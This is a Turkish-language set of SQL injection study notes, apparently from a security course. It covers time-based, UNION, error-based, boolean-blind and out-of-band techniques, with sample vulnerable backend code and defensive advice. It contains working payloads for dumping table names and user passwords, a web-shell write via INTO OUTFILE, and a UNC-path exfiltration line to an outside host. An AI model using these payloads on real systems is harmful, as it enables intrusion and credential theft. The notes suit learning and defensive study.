@@ -1,0 +1,850 @@
+# 0x01 | SQL Injection
+
+```python
+	                 SQLi Time Based Payloadlar İle Tespit Edilir!
+	                                 '-sleep(5)-'
+	                      MySQL/MariaDB	      SLEEP(5)
+												MSSQL	              WAITFOR DELAY '0:0:5'
+												PostgreSQL	        pg_sleep(5)
+												Oracle	            DBMS_LOCK.SLEEP(5)
+												SQLite              randomblob(1000000000);
+												
+									 ',#,--," BU YAPILARI DA KULLANIRSIN TESPİT İÇİN
+```
+
+## Gerekli Ön Bilgiler
+
+SQLi
+
+Saldırganın yazdığınız web uygulamasını kullanarak veritabanında kendi sql sorgularını çalıştırabilmesi.
+
+Genelde KRİTİK bir açıktır.
+
+```sql
+/etc/init.d/mysql start => mysql i başlat
+mysql -u root -p => root olarak mysql'e bağlanma isteği attın -u user -p password
+```
+
+SELECT 1; SONUCU 1’DİR.
+
+![image.png](attachment:d0764579-25a9-4ced-a9e5-2e11db4e3723:image.png)
+
+SELECT 2-1; 2-1 İN SONUCU 1’dir
+
+Yani Veritabanı burada Çıkartma İşlemini Gerçekleştirebiliyor.
+
+![image.png](attachment:c3b96ae8-e161-4eba-927d-fcf86607a64e:image.png)
+
+SELECT 2+1; Sonucu 3’tür 
+
+Veritabanın kendisi toplama işlemi yapabildiğini öğrendik.
+
+![image.png](attachment:f176bf56-78c3-4697-8d5a-ee1cd7ebdde5:image.png)
+
+SELECT ‘2-1’; Sonucu 2-1’dir 
+
+‘’ İçinde yazılan ifade String değer döndürür içinde işlem olsa bile
+
+![image.png](attachment:794cfbdb-b6bd-446e-88b3-6e790aa5e1a2:image.png)
+
+SELECT ‘2’-’1’; Sonucu 1;
+
+String ifade inteager’a cast edildi ve çıkarma işlemi yapıldı.
+
+![image.png](attachment:35c7f367-371e-4383-8d67-783bda5943a5:image.png)
+
+SELECT ‘2’+’1’;  Sonucu 3;
+
+String ifade int cast edildi  ‘’ içerisinde sonra toplama işlemi yapıldı
+
+![image.png](attachment:7fd7fc3d-3627-4699-bd7b-88c53ed0da9c:image.png)
+
+SELECT ‘2’+’a’; Sonucu 2;
+
+a ifadesini int’e cast edemediği için = 0 dedi 2+0 = 2
+
+![image.png](attachment:14b93d5d-b8b4-44e3-9283-3d4d6241cf06:image.png)
+
+SELECT ‘b’+’a’ ; Sonucu 0
+
+ifadeler int’e cast edilemediğindne = 0
+
+![image.png](attachment:eb373dfd-ed4f-4962-97e8-db110b173066:image.png)
+
+SELECT ‘2’ ‘1’; Sonucu 21
+
+Concatiation işlemi yapılır Birleştirme  
+
+![image.png](attachment:ea8213ee-6da5-4bb4-84d9-6de3c9f2c1ec:image.png)
+
+SELECT ‘2’ ‘1’ ‘A’; 21A
+
+Concant işlemi yapılır.
+
+![image.png](attachment:41661e11-1904-41a6-82dc-0cfe24049424:image.png)
+
+SELECT ‘2’ ‘1’ ‘A’-1; Sonuç :CONCAT(21A)-1 ⇒ 21-1 = 20
+
+![image.png](attachment:01882ae7-136f-4455-be72-1904dcfc1bed:image.png)
+
+```sql
+=> Neden 210 değil?
+'2' '1' 'A' yan yana yazınca Concat('2','1','A') = '21A'
+A burada sadece metin, 0 sayısal değeri yok.
+MySQL '21A'’yi sayıya çevirince sadece baştaki 21 okunuyor, A yoksayılıyor.
+21 - 1 => 20
+```
+
+SELECT 2^1; 3
+
+![image.png](attachment:1332b2cf-6e09-4078-a80a-4312db5f3419:image.png)
+
+^ xor operandıdır.
+
+2^1 sql_yacc.yy / [item.cmpfun.cc](http://item.cmpfun.cc) gibi parse rule da ve opreator handler’da bunlar işlenir mysql serverda derlendi ve çalıştı
+
+Her database engine de ^ xor operandı olmak zorunda değildir 
+
+⇒ Mysql de ^bitwise XOR
+
+⇒ PostgreSQL # bitwise XOR ^exponant’dir (üst)
+
+```sql
+												XOR nasıl çalışır
+Aynı bitler varsa → 0
+Farklı bitler varsa → 1
+
+2: 10 (binary)
+1: 01 (binary)
+--------------
+	 11 (binary)
+XOR sonucu: 11 = 3
+```
+
+SELECT 2^2; 0
+
+![image.png](attachment:e1a03108-fb09-46d7-b738-537004e58b08:image.png)
+
+SELECT !1; 0
+
+NOT komutu
+
+![image.png](attachment:3e6ca1e3-27b0-42f0-b2ae-ae10e1a1eb71:image.png)
+
+SELECT ~1;
+
+![image.png](attachment:08249042-322d-451e-8f41-1e87a240b4f8:image.png)
+
+INT_MAX verir
+
+![image.png](attachment:359d23a4-e655-4ef8-8f5c-3cb85df7b72f:image.png)
+
+ORACLE da böyleymiş
+
+---
+
+Database yaratıp deneme yapıcaz
+
+```sql
+CREATE database test;
+use test;
+CREATE TABLE users(
+ id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+ firstname VARCHAR(30) NOT NULL,
+ lastname VARCHAR(30) NOT NULL
+);
+```
+
+```sql
+INSERT INTO users(firstname,lastname) VALUEs ('mehmet','ince');
+INSERT INTO users(firstname,lastname) VALUEs ('mehmet ','ince');
+INSERT INTO users(firstname,lastname) VALUEs ('mehmet  ','ince');
+INSERT INTO users(firstname,lastname) VALUEs ('mehmet   ','ince');
+INSERT INTO users(firstname,lastname) VALUEs ('mehmet    ','ince');
+
+SELECT * FROM users;
+```
+
+![image.png](attachment:f9091f3e-473f-4bde-ad22-7df541b01e54:image.png)
+
+```sql
+SELECT * FROM users WHERE firstname = 'mehmet';
+```
+
+![image.png](attachment:f9091f3e-473f-4bde-ad22-7df541b01e54:image.png)
+
+Beklenti: İlk satırdaki mehmetin gelmesi ama hepsi geliyor
+
+SELECT default’da döndüğü veri üstünde trim yapmazken 
+
+Veri araken trim ( str.strip() )yapar!
+
+```sql
+----- EKSTRA NOT BUNU BEN EKLİYORUM! ----- CHATGPT ETKİSİ
+uygulama tarafında username'e gelen verileri trimle her zaman
+=> trim boşluklu username kullanımını kısıtlar
+
+Unique username kullanımı aynı kullanıcının oluşmasını engeller
+bunda hata kontrolünde bu username kullanıldığını göstermen lazım
+=> Bu saldırgana bu username in var olduğunu gösterir ama problemi çözer
+
+=> “Şifremi unuttum” işleminde tam eşleşme yap
+SELECT * FROM users WHERE BINARY username = ?; gibi => Exatc match olur
+
+Bu bilgiler Chatgpt'den alındı! sırf merakımın sonucu olarak ekledim!
+Bu kısım için Bilgilerin gerçekliğinden şüphe edin!
+-----------------------------------------------------------------
+```
+
+```sql
+	!!!!!  BU NEYE SEBEP OLUR ?
+Bir kullanıcı 'admin ' kullanıcı yaratırsa ve
+Şifre Değiştir / Şifremi Unuttum yaparsa
+Sistem Tüm 'admin' ile başlayan kullanıcıların şifresini değiştiri-
+-lebilmesine sebebiyet verir!!!!!
+```
+
+```sql
+	!!!!  NASIL KORUNULUR BUNDAN ?
+++ EXATC MATCH AÇILINILIRSA 
+++ APPLICATION "INPUT VALLIDATION" YAPILIRSA BU PROBLEMİN ÖNÜNE 
+GEÇİLEBİLİRMİŞ
+```
+
+                                             HEPSİ AYNI SONUCU DÖNDÜRÜR
+
+```sql
+SELECT * FROM haberler WHERE id = 1 and 1=1
+SELECT * FROM haberler WHERE id = 1 and (SELECT 1)=1
+SELECT * FROM haberler WHERE id = 1 
+
+2. YAZDIĞIN SANA SORGU YAZABİLMENE OLANAK SAĞLIYOR EKSTRA BİLGİ ÇEKMEK İÇİN
+```
+
+---
+
+## UNION SQLi
+
+```sql
+Web Sitesinin Adresi: www.x.com/?id=1
+arkada dönene işlem
+SELECT * FROM haberler WHERE id = 1
+
+DÖNEN CEVAP
+<html>
+	MDISEC 
+</html>
+
+-----------------------
+Web Sitesinin Adresi: www.x.com/?id=2
+arkada dönene işlem
+SELECT * FROM haberler WHERE id = 2
+
+DÖNEN CEVAP
+<html>
+	LINUZZ
+</html>
+
+=======================================
+Adrese giden Request sonucu tetiklenen backend
+Pentest yaparken bu backende sahip değiliz!.
+Biz sadece yukarıdan get isteğini yollayabiliyoruz
+
+id = request.get('id')
+
+query= "SELECT * FROM haberler WHERE id ="+id
+
+result = db.execute(query)
+
+if result.size() > 0: # Buradan Veritabanında veri döndüğünü anladık
+	for i in result:
+		print(i.title)
+	else:
+		print("haber yok!")
+```
+
+```sql
+ANLAMAMIZ GEREKEN KISIM BURAYA GELİYOR İŞTE TÜM SÜREÇ ŞU
+
+Web Sitesinin Adresi: www.x.com/?id=2-1
+arkada dönene işlem
+SELECT * FROM haberler WHERE id = 2-1
+
+DÖNEN CEVAP
+<html>
+	MDISEC
+</html>
+
+ulaşırsak id = 1 olan kullanıcıya ulaştık!!!!
+Veritabanında Çıkartma İşlemi Yapabildin Bu Bir 
+Arka Planda Yazılımcının Düşünmediği Bir Zaafiyeti Buldun!!!
+```
+
+Tüm vuln’ların 2 tane adımı vardır
+
+1. Zafiyetin Tespiti
+2. Zafiyetin Sömürülmesi
+
+Expected Behavior’u bul 2’si 
+
+```sql
+Expected Behavior seç 1 tane Initial point'in olmalı ve bir şekilde
+o initial point'e ulaşabiliyorsan tebrik ederim Zaafiyet'i buldun!
+
+SELECT * FROM haberler WHERE id = 1 ⇒ MDISEC 
+SELECT * FROM haberler WHERE id = 2 ⇒ LUNIZZ
+SELECT * FROM haberler WHERE id = 2-1 ⇒ MDISEC buluyorsak
+```
+
+2-1 yerine bir subquery’ de yazabilirsin 
+
+id = (SELECT … )
+
+```sql
+SELECT * FROM haberler WHERE id = 1 
+UNION 
+SELECT * FROM X
+```
+
+X’E ne yazıcam abi?
+
+X YERİNE ABİ bişi yazmicaksın
+
+UNION SELECT 1 yapıcaksın ve çalışıcak
+
+UNION’ın limitasyonu var 1 önceki sorguyla aynı coloumn sahip olmalı
+
+```sql
+www.ex.com/listproducts.php?cat=2
+endpoint listproducts ise veritabanındaki products'lar içindeki bir
+table a select sorgusu çalışıcak ve bu select sorgusunu bilmesek de
+category coloumn'una bir where clause gelmeli products ile category
+arasında M to M relation olur 
+select sorgusunda bir join var join category tablosuna gidip
+category tablosundaki id'ye tekabül edicek ve buradan limitasyon
+yapabil
+
+cat=1 ile cat=2-1 aynı sayfa ise evet burada bir sqli açığı var
+```
+
+```sql
+SELECT * FROM haberler WHERE id = 1 
+UNION 
+SELECT 1
+```
+
+### HATA İLE KARŞILAŞMA
+
+![image.png](attachment:d5d30bc1-7f14-4760-aeab-9cd640b8db06:image.png)
+
+Hata Coloumn Sayılarının Farklı olduğunu söylüyor Bu hata sayesinde 
+
+select 1 referans noktana döndürtmedi seni
+
+```sql
+id = request.get('id')
+
+query= "SELECT * FROM haberler WHERE id ="+id
+
+try # Bu kısmı eklersen bu hata da kaybolur 
+	result = db.execute(query) #
+except Exception as e: #
+	pass #
+
+if result.size() > 0: # Buradan Veritabanında veri döndüğünü anladık
+	for i in result:
+		print(i.title)
+	else:
+		print("haber yok!")
+
+```
+
+### İlk Dikkat Etmen Gereken Şey SQLi’ın var olduğunu keşfetmen lazım! Sonra 
+Diğer Yöntemleri Kullanman Lazım
+
+```sql
+SELECT * FROM haberler WHERE id = 1 
+UNION 
+SELECT 1,2,3,4,5,6,... referans noktanı bulana kdar ekle
+```
+
+![image.png](attachment:b37a25fc-8034-438e-8640-081a51c686f9:image.png)
+
+```sql
+cat=1 UNION SELECT 1,2,3,4,5,6,7,8,version(),10,11
+7 2 9 ifadeleri Sistemdeki queryden gelen select içerikleri
+Burada karşı taraftan bilgileri elde edebileceğin yer oluyor
+Tüm Helper Function'lar kullanımına hazır oluyor
+System Information Functions bilgilerini çalabilme şansı tanıyor bu SQLi,
+Information Functions, System Functions, Metada Functions
+version(),
+```
+
+```sql
+cat=-999999999999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11
+-999999999 böyle bir auto increment id'li kayıt yoktur 
+UNION'dan önceki select in dönmesini sağlayarak sadece kendi select sorgunun
+cevaplarına ulaşabilmek için yaptık
+```
+
+![image.png](attachment:2d9dd944-c6a5-4c9c-92a1-c1ceb85e215b:image.png)
+
+Her İlişkisel Veritabanı sistemindeo sistemdeki TABLE, COLOUMN İSİMLERİNİ BARINDIRAN 
+
+SİSTEM TABLOSU VAR bunun üstünden “mysql list table of database”
+
+Information Schemas’dan tablo isimlerini çekersen erişebilirsin
+
+```sql
+acuart => DB
+cat=-99999 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11 FROM acuart.tables 
+
+cat=-99999 UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables 
+WHERE table_schema = database();
+```
+
+![image.png](attachment:ecafbd9a-ec7d-413e-b9bc-6eedff006302:image.png)
+
+users’ın coloumn’larını çekmek istediğinde
+
+```sql
+cat=-99999 UNION SELECT 1,2,3,4,5,6,colomn_name,8,9,10,11 FROM information_schema.columns
+WHERE table_name = 'users';
+```
+
+![image.png](attachment:b7ab85f7-cad2-40cc-a8ac-f7b4547c9f7e:image.png)
+
+```sql
+cat=-99999 UNION SELECT 1,2,3,4,5,6,uname,8,9,10,11 FROM users;
+
+uname yerine pass de yazabilirsin ya da daha iyisi
+
+concat(uname,':K.Adı:',pass,':Sifre:')
+örnekteki concat(uname,':MDISEC:'pass)
+```
+
+![image.png](attachment:e51a03bd-7f2b-4d4a-a094-19ce198d0dd3:image.png)
+
+SQLMAP bu şekilde information schemadan ⇒ db ⇒ table ⇒ table ⇒ DATA’ya ulaşıyoz
+
+### SQLMAP İŞTE BU ŞEKİLDE ÇALIŞIYOR UNION BASED SQLi
+
+## ERROR BASED SQLi
+
+try exceptionlar koyulmadığı zaman
+
+⇒ Veritabanında bir hata oluştuğu zaman sitede hata göstermeye sebep olur
+
+```sql
+id = request.get('id')
+
+query= "SELECT * FROM haberler WHERE id ="+id
+
+# try # Hata kısmı kontrol edilmeseydi
+	result = db.execute(query) 
+#except Exception as e: #
+	#pass 
+
+if result.size() > 0: # Buradan Veritabanında veri döndüğünü anladık
+	for i in result:
+		print(i.title)
+	else:
+		print("haber yok!")
+
+```
+
+![image.png](attachment:08127cd0-43ff-4151-9cd0-8762001a1c8a:image.png)
+
+```sql
+!! Burada Bir Yöntem Var Bilgi Toplamak Adına !!
+
+SQL'de kullanılabilir bir fonks. parametre olarak xml alarak parametre döndürür
+=> extractValue(rand(), Veri_Çekmen_İçin_Gerekli_Helper)
+
+Hata mesajındaki açığı kullanarak kendimize db hakkında bilgi toplama fırsatı sunuyor
+```
+
+```sql
+Sorgu içerisindeki String bir değeri hatalı bir değer döndürebilirsen
+=> SubQuery Kullanabilirsin!
+concat daha çok veri çekmene yarar
+
+extractvalue(rand(), concat(1, SELECT(database())));
+```
+
+Oluşan yapı şu olucak
+
+```sql
+Web Sitesinin Adresi: www.x.com/?id=extractvalue(rand(), concat(1, SELECT(database())));
+Veya
+Web Sitesinin Adresi: www.x.com/?id=1 and 1=extractvalue(rand(), concat(1, SELECT(database())));
+Arkada Dönen İşlem
+SELECT * FROM haberler WHERE id =extractvalue(rand(), concat(1, SELECT(database())));
+
+DÖNEN CEVAP
+<html>
+	Hata İçinde XPATH ile DB ismi
+</html>
+
+=============
+```
+
+![image.png](attachment:609a7773-49db-4587-9b65-58bff54a7ad6:image.png)
+
+=====
+
+```sql
+Web Sitesinin Adresi: www.x.com/?id= 1' and '1'='1 #$input olucak
+
+SELECT * FROM haberler 
+WHERE id = '$input' # '1' and '1'='1' gibi olucak id = 1 ve 1=1 durumuna bakar 1=1 olduğundan id=1 döner
+#
+DÖNEN CEVAP
+<html>
+	MDISEC
+</html>
+
+# DELETE * FROM hab WHERE  or kullansaydın veriyi patlatırdın
+# NE YAPTIĞINA EMİN DEĞİLSEN OR KULLANMA
+# AUTH BYPASS 
+```
+
+```sql
+Web Sitesinin Adresi: www.x.com/?id= 1' and 1=1 #
+
+SELECT * FROM haberler 
+WHERE id = '1' and 1=1 #' 
+
+WAF bypass için id = 2^1 dene id =3 olan kişiye ulaşabiliyorsan ++
+```
+
+### IN SORGULARINDAN KAÇINMAK İÇİN
+
+```sql
+Web Sitesinin Adresi: www.x.com/?id=1) UNION SELECT #
+
+SELECT * FROM haberler 
+WHERE id IN (1) UNION SELECT #) #HATA MESAJINI ALMAMAK İÇİN YAZIYOSUN
+```
+
+## EN AZ TEST İLE SQLi BULMA
+
+# BOOLEAN-BASED SQLi —— BLIND SQLi
+
+```sql
+SELECT * FROM haberler WHERE id = '1''';
+1 = ' olanı aratıyorsun
+ama Veritabanı bu inteager ı birleştiriyor
+True False oynayarak da bulabilirmişsin. 
+```
+
+```sql
+Backend kodu böyle düzeltirsek
+
+id = request.get('id')
+
+query= "SELECT * FROM haberler WHERE id ="+id
+
+result = db.execute(query) 
+
+#Hataya göre bilgi edinicez
+if result.size() > 0: 
+	print("haber var")
+else:
+	print("haber yok!")
+```
+
+```sql
+www.x.com/?id=1
+SELECT * FROM haberler WHERE id= 1
+
+<html>
+	Haber Var
+</html>
+===
+
+www.x.com/?id=1
+SELECT * FROM haberler WHERE id= 2-1
+
+<html>
+	Haber Var
+</html>
+
+# Artık veri yok | Yani Uygulama Sorgunun Sonucunu Sana Vermicek
+# Peki buradan nasıl veri çıkarıcaksın?
+```
+
+Bu noktada artık True False oynamak zorunda kalıyorsun 
+
+```sql
+www.x.com/?id=1
+SELECT * FROM haberler WHERE id= 1 and (SELECT 1)=2 # 1 = değildir 2
+
+<html>
+	Haber Yok
+</html>
+===
+```
+
+<aside>
+💡
+
+HELPER FUNC
+
+SUBSTRING(
+
+STRING İFADE #’MEHMET’
+
+,HANGİ KARAKTERDEN
+
+,HANGİ KARAKTERE KADAR KESİCEK
+
+); ⇒ M döner
+
+</aside>
+
+```sql
+www.x.com/?id=1
+SELECT * FROM haberler WHERE 
+id= 1 and SUBSTRING(
+	(SELECT table_name FROM information_schema.tables 
+	WHERE table_schema = database() LIMIT 1,1,) #users döndüğü varsayalım ARRAY DÖNMEMELİ
+	,1
+	,1 
+)='a' # ifade 'u' olduğunu bulanana kadar haber yok görürsün
+
+<html>
+	Haber Yok
+</html>
+===
+
+www.x.com/?id=1
+SELECT * FROM haberler WHERE 
+id= 1 and SUBSTRING(
+	(SELECT table_name FROM information_schema.tables 
+	WHERE table_schema = database() LIMIT 1,1,) #users döndüğü varsayalım ARRAY DÖNMEMELİ
+	,2
+	,1 
+)='s' # ifadede 2.harfin 's' olduğunu bulanana kadar haber yok görürsün
+
+bu işlemi her harf için yapınca table name i bulmuş olucaksın bunun için bir for döngülü
+kod yazsan karşıdaki db table içeriklerini çıkarmış olucaksın
+														!!! sqlmap' de bunu yapıyor'. !!!
+
+SELECT * FROM haberler WHERE 
+id= 1 and SUBSTRING(
+	(SELECT table_name FROM information_schema.tables 
+	WHERE table_schema = database() LIMIT 2,1,) #password döndüğü varsayalım ARRAY DÖNMEMELİ
+	,1
+	,1 
+)='p' # ifadede 2.harfin 'p' olduğunu bulanana kadar haber yok görürsün
+
+2. table için arama yapıyor olucaksın
+```
+
+<aside>
+💡
+
+Bu Yapıcağın Arama İşlemi Çok Uzun Sürücek a-z + A-Z + 0-9 _-~ özel karakterler var 
+1 harf için 70 deneme yapmak zorunda kalıyorsun bunu çözmenin yolu da şu
+
+SELECT * FROM haberler WHERE 
+id= 1 and SUBSTRING(
+	(SELECT table_name FROM information_schema.tables 
+	WHERE table_schema = database() LIMIT 2,1,) #password döndüğü varsayalım ARRAY DÖNMEMELİ
+	,1
+	,1 
+)='p' #Senin için Problem olan kısım burası YAVAŞLATAN YANİ onu aşağıda çözüyoruz
+
+</aside>
+
+```sql
+query = SELECT * FROM haberler WHERE
+id= 1 and ASCII(
+  SUBSTRING(
+    (SELECT table_name FROM information_schema.tables WHERE
+    table_schema=database() LIMIT 1,1) #users
+    ,1
+    ,1
+)
+)>(32+129)/2=80
+
+# 117 80den büyük mü ? evet = haber var
+# artık 80den büyük bir değer olduğunu anlıyoruz.
+# Bu şekilde binary search mantığı ile
+# aradığımız karakteri bulmuş oluyoruz.
+
+<html>
+	HABER VAR
+</html>
+```
+
+Arama Yapıcağımız Aralık Burası 
+
+![image.png](attachment:e08cd97a-ec99-40af-b2c2-d616029a1d54:image.png)
+
+```sql
+query = SELECT * FROM haberler WHERE
+id= 1 and ASCII(
+  SUBSTRING(
+    (SELECT table_name FROM information_schema.tables WHERE
+    table_schema=database() LIMIT 1,1) #users
+    ,1
+    ,1
+)
+)>80 #users ı buldun bi şekil
+
+BURADA DA USERS İÇİNDEKİ KULLANICIYI BULUYORSUN VERİ ÇEKMEK İÇİN
+
+query = SELECT * FROM haberler WHERE
+id= 1 and ASCII(
+  SUBSTRING(
+    (SELECT column_name FROM information_schema.columns WHERE
+    table_name='users' LIMIT 1,1) #Usernamei arıyon
+    ,1
+    ,1
+)
+)>(32+129)/2=80
+```
+
+```sql
+Backend kodu böyle düzeltirsek
+
+id = request.get('id')
+
+query= "SELECT * FROM haberler WHERE id ="+id
+
+result = db.execute(query) 
+
+#Hataya göre bilgi edinicez
+
+print("MERHABA :)")
+
+# Veri tabanında aradığını bulsan da bulmasan da hep aynı şey karşına çıkıcak
+# Time Based SQLi kullanırsın burda Sistemi bir süreliğine dondurabiliyorsan
+# Ve bu senin istediğin şeyi bulduğun durumda oluyorsa tebrikler sistemde öyle bir
+# veri var ve sen buna ulaşabiliyorsun.
+```
+
+<aside>
+💡
+
+IF(CONDITION, #1=1
+
+TRUE İSE, #1
+
+FALSE İSE #0
+
+);
+
+</aside>
+
+```sql
+	SELECT * FROM users 
+	WHERE id = IF(SUBSTRING(SELECT('ahmet'),1,1)='a',sleep(5),0)
+	
+	SELECT * FROM users 
+	WHERE id = IF(1=1,sleep(5),0)
+	=> her entry için bekeleme süresi x 5 kaynaklı bu kadar zaman alıyor dönüşü
+	
+	where id = 1 and 1 = IF(1=1,SLEEP(1),0);
+	o zaman probleminin bir kısmını aşarson
+	=> shortcut circuit yaptığından 1 kere entry bakıp dönüyor
+```
+
+![image.png](attachment:0167f909-dcc6-44e8-ad85-cf5e476ee7e1:image.png)
+
+                                                 Fotoğraftaki yapı %100 doğru değildir!
+
+Sleep(5) Sadece bu sql sorgusu için sleep yapar resource tutuyor haricinde sql işlemlerine eş zamanlı
+
+devam ediyor
+
+## OUT OF BAND SQLi
+
+```sql
+========================
+
+id= request.get('id')
+
+rabbitmq.pushTask('report_generate',id)
+
+print("selam")
+```
+
+<aside>
+💡
+
+r57 veya c99 saldırıları burda yapabiliyormuşsun
+
+SELECT ‘<?= system(@$_GET['cmd']) ?>' INTO OUTFILE ‘/var/www/html/c99.php’
+
+INTO OUTFILE ⇒ Diske VERİ YAZAR
+
+cat /var/www/html/c99.php bizim bu yazdığımız kod vardır
+
+</aside>
+
+### DATA EXFILTRATION VIA SQLi
+
+```sql
+SELECT 'mehmet' INTO OUTFILE '\\\hacker.mdisec.com/a';
+
+Windows hacker.mdisec.com SAMBA bağlantısıyla 445 Domain i çözmeye çalışır
+Win OS DNS'te hacker.mdisec.com'u sorar 
+
+SELECT 'mehmet' INTO OUTFILE '\\\'+(SELECT 'table_name (BURADA KENDI SQL KODUNU ÇALIŞTIRIRSIN)' )+'.mdisec.com/a';
+```
+
+![image.png](attachment:abcc5dd6-5610-44cf-bea9-ca809869e6c0:image.png)
+
+Engellemek İçin
+
+DB Server Outband’lerini Kısıtla Local’e izin ver 
+
+```sql
+DB Server ➡️ Internet (BLOCK)
+DB Server ➡️ Local DNS resolver (ALLOW)
+```
+
+UNC path’leri kontrol et
+
+### ORM OBJECT RELEATIONAL MAPPING
+
+```python
+class Haberler(Table):
+	id = db.auth()
+	
+id = request.get('id')
+
+Haberler.filter(id).get
+# query = "SELECT * FROM haberler WHERE id = :id => Yaptığın Potansiyel SQLi
+
+db.execute(query)
+
+print(selam)
+```
+
+⇒ Komplike Sorgu Yapmaya Çalıştığın Yerlerde
+
+Reporting Ekranları - Centeral Stored Procedure’lerde  ⇒ Mikro API’ler bunu engellemeye yönelik
+
+ 
+
+```python
+class Haberler(Table):
+	id = db.auth()
+	
+query = "SELECT * FROM haberler WHERE id = '1' => Hard parssing yapmak zorunda kalır 
+sistem yavaşlar| Hard parssing : 
+
+SELECT * FROM haberler WHERE id = :id | Şeklinde olması SQLi bir nebze azaltırmış
+
+db.execute(query,id)
+
+print(selam)
+
+# SQLi'ın oluşmasının sebebi => Data nın data olarak kalmaması Veritabanı Sorgu dönüşmesi
+```
+
+### TÜM İŞLEMLER LOGLANMALI
